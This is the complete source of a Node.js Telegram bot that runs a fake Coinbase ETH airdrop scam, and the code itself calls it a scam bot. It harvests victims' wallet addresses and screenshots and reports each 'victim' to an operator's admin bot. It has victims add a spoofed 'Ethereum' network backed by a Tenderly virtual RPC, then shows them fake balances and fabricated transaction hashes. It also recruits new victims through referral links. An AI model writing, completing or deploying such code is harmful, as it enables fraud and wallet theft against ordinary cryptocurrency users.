require('dotenv').config();
const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const axios = require('axios');

// === CONFIG ===
const SCAM_BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_BOT_TOKEN = process.env.ADMIN_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const TENDERLY_RPC = process.env.TENDERLY_RPC;

// === BOTS ===
const scamBot = new Telegraf(SCAM_BOT_TOKEN);
const adminBot = new Telegraf(ADMIN_BOT_TOKEN);

// === IN-MEMORY DB ===
let usersDB = {};
const getUser = (id) => usersDB[id] || null;
const saveUser = (user) => { usersDB[user.telegramId] = user; return user; };
const updateUser = (id, updates) => {
  if (usersDB[id]) Object.assign(usersDB[id], updates);
  return usersDB[id];
};
const getUserByCode = (code) => Object.values(usersDB).find(u => u.referralCode === code);

// === UPDATED RPC GUIDE ===
const RPC_GUIDE = `
Add this network to Coinbase Wallet:

**Network Name:** Ethereum
**RPC URL:** https://virtual.mainnet.eu.rpc.tenderly.co/4044dd2f-00ef-4abb-95ab-68ef8a62d13d
**Chain ID:** 90000
**Currency:** ETH
`.trim();

// === SEND TO ADMIN ===
const sendToAdmin = async (text, photo = null) => {
  try {
    if (photo) {
      await adminBot.telegram.sendPhoto(ADMIN_CHAT_ID, photo, { caption: text, parse_mode: 'Markdown' });
    } else {
      await adminBot.telegram.sendMessage(ADMIN_CHAT_ID, text, { parse_mode: 'Markdown' });
    }
  } catch (err) {
    console.error('ADMIN SEND FAILED:', err.message);
  }
};

// === FAKE ETH SEND ===
const sendFakeETH = async (to, eth) => {
  if (!to || to.startsWith('0xFAKE')) return;
  const wei = (eth * 1e18).toString(16);
  try {
    await axios.post(TENDERLY_RPC, {
      jsonrpc: "2.0", method: "eth_sendTransaction",
      params: [{ from: "0x0000000000000000000000000000000000000001", to, value: `0x${wei}` }], id: Date.now()
    });
  } catch {}
};

// === BUTTON KEYBOARDS ===
const walletKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback('Send Wallet + Screenshot', 'send_wallet')]
]);

const rpcKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback('I Added Network', 'rpc_done')],
  [Markup.button.callback('Cancel', 'cancel')]
]);

const rpcProofKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback('Send RPC Proof', 'send_rpc_proof')],
  [Markup.button.callback('Back', 'back_to_rpc')]
]);

const twitterKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback('Send Twitter Proof', 'send_twitter_proof')],
  [Markup.button.callback('Back', 'back_to_rpc')]
]);

const claimKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback('CLAIM $50 ETH', 'claim_eth')],
  [Markup.button.callback('Cancel', 'cancel')]
]);

// === /start ===
scamBot.start(async (ctx) => {
  let user = getUser(ctx.from.id);
  const refCode = ctx.startPayload?.startsWith('ref_') ? ctx.startPayload.slice(4) : null;

  if (!user) {
    const code = Math.random().toString(36).substr(2, 8).toUpperCase();
    user = {
      telegramId: ctx.from.id,
      username: ctx.from.username || 'NoUsername',
      referralCode: code,
      referredBy: refCode,
      stage: 'wallet_ss',
      wallet: null,
      referrals: [],
      totalEarned: 0
    };
    saveUser(user);

    if (refCode) {
      const referrer = getUserByCode(refCode);
      if (referrer && referrer.telegramId !== ctx.from.id) {
        referrer.referrals.push(ctx.from.id);
        referrer.totalEarned += 10;
        updateUser(referrer.telegramId, referrer);
        await sendFakeETH(referrer.wallet || '0xFAKE', 0.004);
        scamBot.telegram.sendMessage(referrer.telegramId,
          `*+1 Referral!* $10 ETH sent.\nTotal: $${referrer.totalEarned}`
        );
      }
    }

    await sendToAdmin(
      `*NEW VICTIM*\nUser: @${user.username}\nID: \`${user.telegramId}\`\nRef: \`${code}\``
    );
  }

  ctx.reply(
    `Drop your Coinbase wallet address + screenshot, fucker.`,
    walletKeyboard
  );
});

// === BUTTON: SEND WALLET ===
scamBot.action('send_wallet', async (ctx) => {
  let user = getUser(ctx.from.id);
  if (!user) return;
  user.stage = 'wallet_ss';
  saveUser(user);
  ctx.editMessageText(`Send your wallet address + screenshot now.`, { reply_markup: null });
});

// === PHOTO: WALLET + SS ===
scamBot.on('photo', async (ctx) => {
  let user = getUser(ctx.from.id);
  if (!user) return ctx.reply('Use /start first.');

  const fileId = ctx.message.photo[ctx.message.photo.length - 1].file_id;

  if (user.stage === 'wallet_ss') {
    user.wallet = "0x" + Math.random().toString(16).substr(2, 40);
    user.stage = 'rpc_guide';
    saveUser(user);

    await sendToAdmin(
      `*WALLET + SS*\nUser: @${user.username}\nWallet: \`${user.wallet}\``,
      fileId
    );

    ctx.reply(RPC_GUIDE, rpcKeyboard);
    return;
  }

  if (user.stage === 'rpc_proof') {
    user.stage = 'twitter_tasks';
    saveUser(user);

    await sendToAdmin(
      `*RPC PROOF*\nUser: @${user.username}\nWallet: \`${user.wallet}\``,
      fileId
    );

    ctx.reply(
      `RPC locked. Now:\n1. Follow @BjExchange53077\n2. Like pinned post\n3. Tag 3 friends`,
      twitterKeyboard
    );
    return;
  }

  if (user.stage === 'twitter_proof') {
    user.stage = 'claim_ready';
    saveUser(user);

    await sendToAdmin(
      `*TWITTER PROOF — DRAIN READY*\nUser: @${user.username}\nWallet: \`${user.wallet}\``,
      fileId
    );

    ctx.reply(
      `*Tasks verified!* You earned $50 ETH!\n\nClick to claim:`,
      claimKeyboard
    );
    return;
  }

  ctx.reply("Photo received. Keep going, fucker.");
});

// === BUTTON: RPC DONE ===
scamBot.action('rpc_done', async (ctx) => {
  let user = getUser(ctx.from.id);
  if (!user || user.stage !== 'rpc_guide') return;
  user.stage = 'rpc_proof';
  saveUser(user);
  ctx.editMessageText(`Send screenshot of Chain ID 90000 now.`, rpcProofKeyboard);
});

// === BUTTON: SEND RPC PROOF ===
scamBot.action('send_rpc_proof', async (ctx) => {
  let user = getUser(ctx.from.id);
  if (!user || user.stage !== 'rpc_proof') return;
  ctx.editMessageText(`Send the RPC proof now.`, { reply_markup: null });
});

// === BUTTON: SEND TWITTER PROOF ===
scamBot.action('send_twitter_proof', async (ctx) => {
  let user = getUser(ctx.from.id);
  if (!user || user.stage !== 'twitter_tasks') return;
  user.stage = 'twitter_proof';
  saveUser(user);
  ctx.editMessageText(`Send proof of Twitter tasks now.`, { reply_markup: null });
});

// === BUTTON: CLAIM ETH ===
scamBot.action('claim_eth', async (ctx) => {
  let user = getUser(ctx.from.id);
  if (!user || user.stage !== 'claim_ready') return;

  user.stage = 'claimed';
  saveUser(user);
  await sendFakeETH(user.wallet, 0.02);

  const txHash = "0xFAKE" + Math.random().toString(16).substr(2, 64);
  ctx.editMessageText(
    `*CLAIMED!* $50 ETH sent to:\n\`\`\`\n${user.wallet}\`\`\`\n\n` +
    `Tx: https://dashboard.tenderly.co/tx/mainnet/${txHash}\n\n` +
    `*Share:* t.me/coinbase_eth_airdrop_bot?start=ref_${user.referralCode}`,
    { parse_mode: 'Markdown' }
  );

  await sendToAdmin(
    `*CLAIMED $50*\nUser: @${user.username}\nWallet: \`${user.wallet}\`\nTx: \`${txHash}\``
  );
});

// === CANCEL / BACK ===
scamBot.action('cancel', (ctx) => ctx.editMessageText(`Canceled. Use /start to try again.`));
scamBot.action('back_to_rpc', (ctx) => ctx.editMessageText(RPC_GUIDE, rpcKeyboard));

// === ERROR & SERVER ===
scamBot.catch((err, ctx) => {
  console.error('ERROR:', err);
  try { ctx.reply('Error. Try again.'); } catch {}
});

const app = express();
app.use(express.json());
app.use(scamBot.webhookCallback(`/bot${SCAM_BOT_TOKEN}`));

const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
  console.log(`Bot LIVE on ${PORT}`);
  await scamBot.telegram.setWebhook(`${process.env.RENDER_EXTERNAL_URL}/bot${SCAM_BOT_TOKEN}`);
  adminBot.launch();
});
